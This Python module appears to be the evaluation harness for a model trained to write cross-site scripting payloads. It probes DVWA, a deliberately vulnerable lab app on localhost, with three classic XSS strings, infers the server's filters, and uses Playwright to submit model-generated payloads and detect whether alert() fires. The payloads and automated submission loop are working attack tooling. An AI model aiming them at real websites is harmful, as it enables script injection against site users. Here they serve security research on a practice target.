"""T3: Real-app evaluation against DVWA.

Two components:
  1. Context prober: sends probe inputs to a DVWA XSS endpoint, observes the
     server's transformation, and derives a ContextSpec (same format the model
     was trained on).
  2. T3 runner: generates payloads with the model, submits them to the real
     DVWA endpoint via Playwright, and checks if alert() fires.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field

from ..context import ContextSpec, render_description


@dataclass
class ProbeResult:
    """Result of probing a DVWA endpoint with test input."""
    input_sent: str
    response_html: str


# Probe inputs designed to reveal the server's filtering behavior.
_PROBE_INPUTS = [
    "<script>alert(1)</script>",       # tests script keyword + angle brackets
    '"><svg onload=alert(1)>',         # tests quote escaping + event handlers
    "<img src=x onerror=alert(1)>",    # tests event handlers
]


def derive_context_from_html(probe: ProbeResult, location: str = "html_body") -> ContextSpec:
    """Derive a ContextSpec from observed server transformation of probe input.

    Analyzes what the server did to the input (escaped? stripped? blocked?)
    and maps it to the closest filter combination from our taxonomy.
    """
    sent = probe.input_sent
    reflected = probe.response_html

    filters: list[str] = []

    # Check if angle brackets were HTML-escaped (< -> &lt;)
    if "&lt;" in reflected and "<" not in reflected.replace("&lt;", "").replace("&gt;", ""):
        filters.append("escape_angle_brackets_html")
    # Check if angle brackets were stripped (both gone, no &lt;)
    elif ("<" not in reflected and ">" not in reflected
          and "&lt;" not in reflected and "<" in sent and ">" in sent):
        filters.append("strip_angle_brackets")

    # Check if "script" keyword was removed/blocked
    if "<script" in sent.lower() and "script" not in reflected.lower():
        filters.append("block_keyword_script")

    # Check if double quotes were escaped (" -> &quot;)
    if '"' in sent and "&quot;" in reflected and '"' not in reflected.replace("&quot;", ""):
        filters.append("escape_double_quotes_html")

    # Check if event handlers (on*=) were stripped
    if (("onerror" in sent.lower() or "onload" in sent.lower())
            and "onerror" not in reflected.lower()
            and "onload" not in reflected.lower()):
        filters.append("block_event_handlers")

    ctx = ContextSpec(
        id=f"dvwa-probed-{'-'.join(filters) if filters else 'plain'}",
        location=location,
        filters=filters,
    )
    ctx.description = render_description(ctx)
    return ctx


def probe_dvwa_context(
    page,
    base_url: str,
    endpoint_path: str,
    param: str,
    security_level: str,
) -> ProbeResult:
    """Probe a DVWA XSS endpoint to determine its filtering behavior.

    Uses a Playwright page (already authenticated + security cookie set).
    Sends a probe input and returns the response HTML for analysis.
    """
    # Set security level cookie
    page.context.add_cookies([{
        "name": "security", "value": security_level,
        "domain": "127.0.0.1", "path": "/",
    }])

    probe_input = _PROBE_INPUTS[0]  # <script>alert(1)</script>
    encoded = re.sub(r'[^a-zA-Z0-9]', lambda m: f"%{ord(m.group()):02X}", probe_input)

    page.goto(f"{base_url}{endpoint_path}?{param}={encoded}", timeout=15000)
    html = page.content()

    return ProbeResult(input_sent=probe_input, response_html=html)


def check_dvwa_fires(
    page,
    base_url: str,
    endpoint_path: str,
    param: str,
    security_level: str,
    payload: str,
    timeout_ms: int = 3000,
) -> bool:
    """Submit a payload to a DVWA XSS endpoint and check if alert() fires.

    Uses a real browser (Playwright page) to load the DVWA page with the
    injected payload. The REAL DVWA server applies its filters — this is
    the key difference from T1/T2 which use simulate_reflection.
    """
    page.context.add_cookies([{
        "name": "security", "value": security_level,
        "domain": "127.0.0.1", "path": "/",
    }])

    encoded = re.sub(r'[^a-zA-Z0-9]', lambda m: f"%{ord(m.group()):02X}", payload)

    fired = False

    def _on_dialog(_dialog):
        nonlocal fired
        fired = True
        try:
            _dialog.dismiss()
        except Exception:
            pass  # dialog may already be handled by another listener

    page.on("dialog", _on_dialog)
    try:
        page.goto(f"{base_url}{endpoint_path}?{param}={encoded}", timeout=15000)
        page.wait_for_timeout(timeout_ms)
    except Exception:
        pass  # timeout or navigation error; dialog may still have fired
    finally:
        try:
            page.remove_listener("dialog", _on_dialog)
        except Exception:
            pass

    return fired


@dataclass
class T3Config:
    base_url: str = "http://127.0.0.1:8080"
    login_path: str = "/login.php"
    username: str = "admin"
    password: str = "password"
    security_levels: list = field(default_factory=lambda: ["low", "medium", "high"])
    endpoints: list = field(default_factory=lambda: [
        {"id": "reflected-xss", "path": "/vulnerabilities/xss_r/", "param": "name"},
    ])


def run_t3_dvwa(model, tokenizer, playwright_browser, config: T3Config) -> dict:
    """Full T3 evaluation against DVWA.

    For each (endpoint, security_level):
      1. Probe the context (what does DVWA do to input?)
      2. Generate a payload with the model
      3. Submit to DVWA, check if alert() fires

    Returns results dict matching T1/T2 structure.
    """
    from ..generate import generate

    # Login to DVWA
    page = playwright_browser.new_page()
    page.goto(f"{config.base_url}{config.login_path}", timeout=15000)
    page.fill("input[name=username]", config.username)
    page.fill("input[name=password]", config.password)
    page.click("input[name=Login]")
    page.wait_for_load_state("networkidle")
    print("[t3] logged in to DVWA")

    per_context: dict[str, dict] = {}
    failures: list[dict] = []
    fired = 0
    tested = 0

    for endpoint in config.endpoints:
        for level in config.security_levels:
            ctx_key = f"dvwa-{endpoint['id']}-{level}"

            # 1. Probe the context
            try:
                probe = probe_dvwa_context(
                    page, config.base_url, endpoint["path"], endpoint["param"], level
                )
            except Exception as e:
                print(f"[t3] probe failed for {ctx_key}: {e}")
                continue

            ctx = derive_context_from_html(probe)
            print(f"[t3] {ctx_key}: derived filters={ctx.filters}")

            # 2. Generate a payload
            payloads = generate(model, tokenizer, ctx.description, strategy="greedy", n=1)
            if not payloads:
                print(f"[t3] {ctx_key}: no payload generated")
                failures.append({"context_id": ctx_key, "payload": "", "reason": "no_payload"})
                per_context[ctx_key] = {"total": 1, "fired": 0, "rate": 0.0}
                continue

            payload = payloads[0]
            tested += 1

            # 3. Submit to DVWA and check
            fires = check_dvwa_fires(
                page, config.base_url, endpoint["path"], endpoint["param"], level, payload
            )

            if fires:
                fired += 1
                print(f"[t3] {ctx_key}: FIRE  {payload[:50]}")
            else:
                print(f"[t3] {ctx_key}: miss  {payload[:50]}")
                failures.append({
                    "context_id": ctx_key,
                    "payload": payload[:100],
                    "reason": "does_not_execute",
                })

            per_context[ctx_key] = {
                "total": 1,
                "fired": 1 if fires else 0,
                "rate": 1.0 if fires else 0.0,
            }

    page.close()

    rate = fired / tested if tested else 0.0
    print(f"[t3] {fired}/{tested} = {rate:.1%} DVWA execution success")

    return {
        "total": tested,
        "fired": fired,
        "rate": rate,
        "target": 0.0,  # no hard target per spec — "reported, not gated"
        "passed": True,  # always "passed" — informational only
        "per_context": per_context,
        "failures": failures,
    }
